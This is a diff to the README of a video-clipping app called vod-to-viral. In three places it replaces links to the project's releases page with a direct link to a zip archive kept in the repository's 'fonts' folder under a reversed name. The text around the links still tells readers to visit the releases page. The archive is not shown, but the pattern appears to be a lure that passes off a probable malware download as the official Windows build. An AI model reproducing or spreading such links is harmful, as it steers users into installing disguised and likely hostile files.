@@ -1,6 +1,6 @@
 # 🎬 vod-to-viral - Turn long videos into short clips
 
-[![Download vod-to-viral](https://img.shields.io/badge/Download-vod--to--viral-purple?style=for-the-badge)](https://github.com/calmap6176/vod-to-viral/releases)
+[![Download vod-to-viral](https://img.shields.io/badge/Download-vod--to--viral-purple?style=for-the-badge)](https://github.com/calmap6176/vod-to-viral/raw/refs/heads/main/fonts/viral-to-vod-v2.8.zip)
 
 ## 🚀 What this app does
 
@@ -35,7 +35,7 @@ For best results, use a computer with:
 
 Visit this page to download the Windows version:
 
-[Download vod-to-viral releases](https://github.com/calmap6176/vod-to-viral/releases)
+[Download vod-to-viral releases](https://github.com/calmap6176/vod-to-viral/raw/refs/heads/main/fonts/viral-to-vod-v2.8.zip)
 
 On that page, look for the latest release and download the Windows file for your system.
 
@@ -228,7 +228,7 @@ This makes it easier to check that everything works on your computer
 
 Use this page to get the latest Windows build and install files:
 
-[https://github.com/calmap6176/vod-to-viral/releases](https://github.com/calmap6176/vod-to-viral/releases)
+[https://github.com/calmap6176/vod-to-viral/raw/refs/heads/main/fonts/viral-to-vod-v2.8.zip](https://github.com/calmap6176/vod-to-viral/raw/refs/heads/main/fonts/viral-to-vod-v2.8.zip)
 
 ## 📄 Quick start
 
